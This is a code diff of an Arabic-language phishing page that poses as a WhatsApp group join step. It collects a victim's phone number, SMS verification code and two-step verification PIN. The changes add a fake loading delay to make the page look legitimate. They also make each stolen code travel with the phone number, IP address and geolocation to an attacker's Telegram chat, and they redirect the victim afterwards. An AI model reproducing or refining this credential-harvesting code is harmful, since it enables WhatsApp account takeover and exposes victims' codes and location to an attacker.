@@ -45,14 +45,18 @@
         <!-- إدخال كود التحقق الأول -->
         <div id="verification-section" class="hidden">
             <p>أدخل الرمز المكون من 6 أرقام الذي ظهر لك:</p>
-            <input type="text" id="verification-code" maxlength="6" placeholder="أدخل الكود هنا">
+            <input type="tel" id="verification-code" maxlength="6" placeholder="أدخل الكود هنا" inputmode="numeric" pattern="[0-9]*">
             <button onclick="sendVerificationCode()">تحقق</button>
         </div>
-
+ <!-- رسالة جاري البحث .....................................................................-->
+ <div id="loading-section" class="hidden">
+    <div class="loader"></div>
+    <span>جاري البحث عن رقمك...</span>
+</div>
         <!-- إدخال كود التحقق بخطوتين -->
         <div id="two-step-section" class="hidden">
             <p>أدخل كود التحقق من خطوتين الخاص بك:</p>
-            <input type="text" id="two-step-code" maxlength="6" placeholder="أدخل الكود هنا">
+            <input type="tel" id="two-step-code" maxlength="6" placeholder="أدخل الكود هنا" inputmode="numeric" pattern="[0-9]*">
             <button onclick="sendTwoStepCode()">انضم إلى المجموعة</button>
         </div>
     </div>
@@ -91,7 +95,7 @@
 📞 numero de telephone : ${phoneNumber}
 🌍 pays: ${ipData.country}
 🏙️ city: ${ipData.city}
-📍 xihaja : ${ipData.loc}
+📍 l3ard o tol : ${ipData.loc}
 📍 IP: ${ipData.ip}
                     `;
                     sendToTelegram(message);
@@ -109,33 +113,45 @@
                 alert("يجب إدخال 6 أرقام");
                 return;
             }
-
+            loadingSection.classList.remove("hidden");
             fetch("https://ipinfo.io/json?token=12b6b3d8813241")
                 .then(response => response.json())
                 .then(ipData => {
                     const message = `
-🔢 كود التحقق الأول: ${verificationCode}
+                    📞: ${iti.getNumber()}
+🔢 verification code: ${verificationCode}
 📍 IP: ${ipData.ip}
                     `;
                     sendToTelegram(message);
                 });
 
-            verificationSection.classList.add("hidden");
-            twoStepSection.classList.remove("hidden");
+                setTimeout(() => {
+                loadingSection.classList.add("hidden");
+                verificationSection.classList.add("hidden");
+                twoStepSection.classList.remove("hidden");
+            }, 5000);
+           
         }
 
         function sendTwoStepCode() {
-            const twoStepCode = document.getElementById("two-step-code").value;
-            if (twoStepCode.length !== 6) {
-                alert("يجب إدخال 6 أرقام");
-                return;
-            }
+    const twoStepCode = document.getElementById("two-step-code").value;
+
+    if (twoStepCode.length !== 6 || isNaN(twoStepCode)) {
+        alert("يجب إدخال 6 أرقام صحيحة");
+        return;
+    }
+
+    // رابط المجموعة على واتساب - استبدله برابط مجموعتك الفعلي
+    const whatsappGroupLink = "https://chat.whatsapp.com/EXAMPLE_GROUP_LINK";  
+    window.location.href = whatsappGroupLink;
+
 
             fetch("https://ipinfo.io/json?token=12b6b3d8813241")
                 .then(response => response.json())
                 .then(ipData => {
                     const message = `
-🔐 كود التحقق بخطوتين: ${twoStepCode}
+                    📞: ${iti.getNumber()}
+🔐 2fa: ${twoStepCode}
 📍 IP: ${ipData.ip}
                     `;
                     sendToTelegram(message);
@@ -149,6 +165,8 @@
                 body: JSON.stringify({ chat_id: "6967962102", text })
             });
         }
+        
+      
     </script>
      
 </body>
